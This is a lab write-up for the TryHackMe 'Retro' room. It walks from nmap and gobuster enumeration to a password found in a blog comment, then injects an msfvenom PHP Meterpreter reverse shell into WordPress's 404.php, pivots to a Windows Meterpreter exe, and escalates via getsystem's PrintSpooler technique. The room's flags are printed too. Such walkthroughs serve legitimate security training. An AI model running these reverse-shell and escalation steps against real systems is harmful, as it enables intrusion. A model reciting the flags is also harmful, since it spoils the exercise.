# TryHackMe — Retro | Full Walkthrough

> **Room:** [Retro](https://tryhackme.com/room/retro)
> **Difficulty:** Hard
> **Author:** vodanhtieutot
> **Platform:** TryHackMe

---

## Table of Contents

1. [Overview](#1-overview)
2. [Reconnaissance — Nmap Scan](#2-reconnaissance--nmap-scan)
3. [Web Enumeration — Gobuster](#3-web-enumeration--gobuster)
4. [Web Application Analysis — Credential Discovery](#4-web-application-analysis--credential-discovery)
5. [Initial Access — WordPress Theme Editor RCE](#5-initial-access--wordpress-theme-editor-rce)
6. [Foothold — Unstable PHP Shell & Pivot to Stable Meterpreter](#6-foothold--unstable-php-shell--pivot-to-stable-meterpreter)
7. [Privilege Escalation — getsystem (PrintSpooler)](#7-privilege-escalation--getsystem-printspooler)
8. [Flag Capture](#8-flag-capture)
9. [Flags & Answers Summary](#9-flags--answers-summary)
10. [Attack Chain Summary](#10-attack-chain-summary)
11. [Tools Used](#11-tools-used)

---

## 1. Overview

**Retro** is a Hard-rated Windows machine on TryHackMe built around a hidden WordPress site. The full attack path follows this chain:

```
Recon → Directory Bruteforce → Credential Discovery (blog comment)
→ WordPress Admin Access → Theme Editor RCE → Meterpreter Shell
→ getsystem (PrintSpooler) → NT AUTHORITY\SYSTEM → Flags
```

**Lab Environment:**

| Detail | Value |
|---|---|
| Target IP | `10.48.182.243` |
| Machine Name | `RETROWEB` |
| OS | Microsoft Windows Server 2016 |
| Open Ports | 80 (HTTP), 3389 (RDP) |
| Attacker | Kali Linux (AttackBox) |

---

## 2. Reconnaissance — Nmap Scan

### 2.1 Quick Port Scan

We start with a full port scan, skipping host discovery with `-Pn` since the target may be blocking ICMP ping:

```bash
nmap -Pn -p- 10.48.182.243
```

![Nmap quick scan — port 80 and 3389 open](images/image1.png)

Only two ports are open:

| Port | State | Service |
|---|---|---|
| 80/tcp | open | http |
| 3389/tcp | open | ms-wbt-server (RDP) |

> A web server is exposed on port 80 and RDP on port 3389. The next step is to fingerprint both services in detail.

### 2.2 Service & Script Scan

Run an aggressive scan with `-sC` (default scripts), `-sV` (version detection), and `-A` (OS detection + traceroute) against the two discovered ports:

```bash
nmap -sC -sV -A -Pn -p 80,3389 10.48.182.243
```

![Nmap service scan — IIS 10.0, Windows Server 2016, hostname RETROWEB](images/image2.png)

Key findings:

| Detail | Value |
|---|---|
| Port 80 | Microsoft IIS httpd 10.0 |
| HTTP Server Header | `Microsoft-IIS/10.0` |
| HTTP Title | `IIS Windows Server` |
| TRACE method | Enabled (potentially risky) |
| Port 3389 | Microsoft Terminal Services |
| Target Name | `RETROWEB` |
| NetBIOS Name | `RETROWEB` |
| DNS Name | `RetroWeb` |
| OS Guess | Microsoft Windows Server 2016 (87%) |
| SSL cert CN | `RetroWeb` |

> **Note:** The IIS default page on port 80 means the web server is running but no application is served at `/` directly. We need to brute-force directories to find the actual web application.

---

## 3. Web Enumeration — Gobuster

### 3.1 Root Directory Scan

We use **Gobuster** to enumerate hidden directories and files on the web server. The `-x php,html,txt` flag ensures we catch common file extensions used in IIS and WordPress environments:

```bash
gobuster dir -u http://10.48.182.243 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt \
-t 50 \
-b 404,403
```

![Gobuster root scan — /retro discovered (Status: 301)](images/image3.png)

Gobuster finds a hidden directory:

```
/retro    (Status: 301) [Size: 150] [→ http://10.48.182.243/retro/]
```

> This is the answer to the room's first question — the hidden directory is `/retro`.

### 3.2 Subdirectory Scan — /retro

We drill deeper into `/retro` to map the full application structure:

```bash
gobuster dir -u http://10.48.182.243/retro \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt \
-t 50 \
-b 404,403
```

![Gobuster /retro scan — WordPress structure revealed with wp-login.php](images/image4.png)

The results confirm this is a **WordPress installation**:

| Path | Status | Notes |
|---|---|---|
| `/index.php` | 301 | WordPress index |
| `/wp-content` | 301 | Media / plugin / theme folder |
| `/wp-login.php` | **200** | Login page — primary target |
| `/license.txt` | 200 | WordPress license file |
| `/wp-includes` | 301 | WordPress core includes |
| `/wp-trackback.php` | 200 | XML-RPC trackback endpoint |
| `/README.html` | 200 | WordPress readme |

> `/wp-login.php` returning HTTP 200 means the login page is live and accessible. Our next goal is to find valid credentials.

---

## 4. Web Application Analysis — Credential Discovery

### 4.1 Browsing the Website

Navigate to `http://10.48.182.243/retro` in the browser:

![Web GUI — "Retro Fanatics" WordPress blog](images/image5.png)

The site is a WordPress blog named **"Retro Fanatics"** — dedicated to retro games, books, and movies. The author of the blog posts is **Wade**, making this a potential WordPress username.

### 4.2 Credential Leak in a Blog Comment

Browsing through the blog posts, we find a comment left by **Wade** on the **"Ready Player One"** post:

![Blog comment by Wade — "Leaving myself a note here just in case I forget how to spell it: parzival"](images/image6.png)

```
Wade — December 9, 2019
"Leaving myself a note here just in case I forget how to spell it: parzival"
```

> 💡 **Finding:** Wade left his own password in a public blog comment as a reminder. This is a critical OPSEC failure — no brute-forcing required at all.

Credentials obtained:
- **Username:** `wade`
- **Password:** `parzival`

---

## 5. Initial Access — WordPress Theme Editor RCE

### 5.1 Logging Into WordPress Admin

Navigate to `http://10.48.182.243/retro/wp-login.php` and log in with the discovered credentials:

![WordPress login page — wp-login.php](images/image7.png)

Login successful with `wade:parzival`.

### 5.2 Identifying the Attack Surface

Once inside the WordPress admin panel, navigate to **Appearance → Themes**:

![WordPress admin — Themes page, active theme is "Twenty Seventeen"](images/image8.png)

Key observations:
- Active theme: **Twenty Seventeen**
- **Theme Editor** is available under Appearance — this allows direct PHP file editing from the browser

> ⚠️ **Vulnerability:** WordPress Theme Editor lets authenticated admins modify PHP source files of installed themes. An attacker can inject a reverse shell payload into any web-accessible PHP file, then trigger execution by navigating to its URL.

### 5.3 Injecting a Reverse Shell into 404.php

Navigate to **Appearance → Theme Editor**, select the **Twenty Seventeen** theme, and open the **404 Template (404.php)**:

```
http://10.48.182.243/retro/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
```

![Theme Editor — 404.php of Twenty Seventeen theme open for editing](images/image9.png)

Generate a PHP Meterpreter payload using **msfvenom**:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=5555 -f raw > shell.php
```

Replace the entire contents of `404.php` with the generated payload, then click **Update File** to save.

### 5.4 Triggering the Reverse Shell

Set up a listener in `msfconsole` before triggering:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 5555
run
```

Then navigate the browser to the `404.php` URL to execute the payload:

```
http://10.48.182.243/retro/wp-content/themes/twentyseventeen/404.php
```

![Browser navigating to 404.php — blank page while shell connects back](images/image10.png)

![msfconsole multi/handler — Meterpreter session received from 10.48.182.243](images/image11.png)

```
[*] Started reverse TCP handler on 192.168.183.178:5555
[*] Sending stage (42137 bytes) to 10.48.182.243
[*] Meterpreter session 3 opened (192.168.183.178:5555 → 10.48.182.243:50386)
```

---

## 6. Foothold — Unstable PHP Shell & Pivot to Stable Meterpreter

### 6.1 Problem With the PHP Shell

The PHP Meterpreter session is inherently unstable — it depends on an active HTTP request to keep the connection alive. Any timeout or interruption will kill the session. We need to pivot to a native Windows Meterpreter session for a more reliable foothold.

**Strategy:** Use the existing PHP shell to upload and execute a compiled Windows `.exe` Meterpreter payload.

### 6.2 Generating a Windows Meterpreter EXE

On Kali, generate `shell.exe` — a Windows x64 Meterpreter reverse TCP payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe
```

![msfvenom generating shell.exe — Windows x64 meterpreter/reverse_tcp, 7680 bytes](images/image12.png)

```
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

### 6.3 Uploading & Executing shell.exe

Set up a second listener in `msfconsole` on port 4444:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

From the existing PHP Meterpreter session, upload and execute `shell.exe`:

```
meterpreter > upload shell.exe
meterpreter > execute -f shell.exe
```

![Meterpreter upload shell.exe → execute -f shell.exe → Process 3124 created](images/image13.png)

```
[*] Uploading  : /home/vodanhtieutot/shell.exe → shell.exe
[*] Completed  : /home/vodanhtieutot/shell.exe → shell.exe
meterpreter > execute -f shell.exe
Process 3124 created.
```

### 6.4 Receiving the Stable Windows Meterpreter Session

The listener on port 4444 catches the callback from `shell.exe`:

![msfconsole — stable Windows Meterpreter session 1 opened from 10.48.182.243](images/image14.png)

```
[*] Started reverse TCP handler on 192.168.183.178:4444
[*] Sending stage (232006 bytes) to 10.48.182.243
[*] Meterpreter session 1 opened (192.168.183.178:4444 → 10.48.182.243:50405)

meterpreter > dir
Listing: C:\inetpub\wwwroot\retro\wp-content\themes\twentyseventeen
```

The shell is running under the IIS service account — a low-privileged user. The uploaded `shell.exe` (7680 bytes, created at 10:17:11) is also visible in the directory listing, confirming successful upload and execution.

---

## 7. Privilege Escalation — getsystem (PrintSpooler)

### 7.1 Enumerating the Filesystem — Access Denied

From the Meterpreter shell, navigate the filesystem to locate the flags:

```
meterpreter > shell
C:\> dir
C:\> cd Users
C:\Users> dir
C:\Users> cd Wade
Access is denied.
```

![`dir C:\` and `C:\Users` — `cd Wade` returns "Access is denied"](images/image15.png)

Findings:
- `C:\Users\Administrator` — requires Administrator or SYSTEM privileges
- `C:\Users\Wade` — **"Access is denied"** — Wade's Desktop likely holds the user flag
- Our current shell runs as the IIS service account, which lacks sufficient permissions to access either directory

### 7.2 Privilege Escalation with getsystem

Back in the Meterpreter prompt, run `getsystem` — Metasploit's built-in privilege escalation module that automatically tries multiple local exploit techniques:

```
meterpreter > getsystem
```

![getsystem — "got system via technique 5 (Named Pipe Impersonation - PrintSpooler)", getuid → NT AUTHORITY\SYSTEM](images/image16.png)

```
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> 🎯 **Privilege Escalation successful!** `getsystem` automatically exploited **Named Pipe Impersonation via PrintSpooler** (technique 5) without requiring any manual CVE exploitation.

**How it works:**
- The Windows Print Spooler service runs as `NT AUTHORITY\SYSTEM`
- Metasploit creates a fake named pipe and forces the PrintSpooler service to connect to it
- When the SYSTEM-level service connects, Meterpreter impersonates its access token
- Result: privilege escalation from the low-privileged IIS service account to `NT AUTHORITY\SYSTEM`

---

## 8. Flag Capture

### 8.1 User Flag (user.txt)

With SYSTEM privileges, access **Wade's** Desktop:

```
C:\Users\Wade\Desktop> type user.txt.txt
```

![`type user.txt.txt` — flag: 3b99fbdc6d430bfb51c72c651a261927](images/image17.png)

> 🚩 **user.txt:** `3b99fbdc6d430bfb51c72c651a261927`

### 8.2 Root Flag (root.txt)

Then access the **Administrator's** Desktop:

```
C:\Users\Administrator\Desktop> type root.txt.txt
```

![`type root.txt.txt` — flag: 7958b569565d7bd88d10c6f22d1c4063](images/image18.png)

> 🚩 **root.txt:** `7958b569565d7bd88d10c6f22d1c4063`

---

## 9. Flags & Answers Summary

| Question | Answer |
|---|---|
| A web server is running on the target. What is the hidden directory which the website lives on? | `/retro` |
| user.txt | `3b99fbdc6d430bfb51c72c651a261927` |
| root.txt | `7958b569565d7bd88d10c6f22d1c4063` |

---

## 10. Attack Chain Summary

```
[1] Nmap -Pn -p-
        → Port 80 (IIS), Port 3389 (RDP)

[2] Nmap -sC -sV -A
        → Windows Server 2016, hostname RETROWEB, IIS 10.0

[3] Gobuster dir /
        → /retro (Status: 301)

[4] Gobuster dir /retro
        → /wp-login.php, /wp-content → WordPress confirmed

[5] Browse /retro
        → Blog "Retro Fanatics", author: Wade
        → Comment leak: "parzival" → credentials wade:parzival

[6] Login /retro/wp-login.php
        → WordPress admin access granted

[7] Appearance → Theme Editor → 404.php
        → Inject PHP Meterpreter payload
        → Trigger via: /wp-content/themes/twentyseventeen/404.php

[8] msfconsole multi/handler (port 5555)
        → PHP Meterpreter session (unstable)

[9] msfvenom → shell.exe (windows/x64/meterpreter/reverse_tcp)
        → upload + execute from PHP shell

[10] msfconsole multi/handler (port 4444)
        → Stable Windows native Meterpreter session

[11] getsystem
        → Technique 5: Named Pipe Impersonation (PrintSpooler)
        → NT AUTHORITY\SYSTEM

[12] type C:\Users\Wade\Desktop\user.txt.txt          → user flag ✓
     type C:\Users\Administrator\Desktop\root.txt.txt → root flag ✓
```

---

## 11. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning & service fingerprinting |
| `gobuster` | Web directory brute-forcing |
| Firefox | Manual web application browsing |
| `msfvenom` | Payload generation (PHP Meterpreter, Windows EXE) |
| `msfconsole` | Exploit framework & multi/handler listener |
| Meterpreter | Post-exploitation (upload, execute, getsystem) |
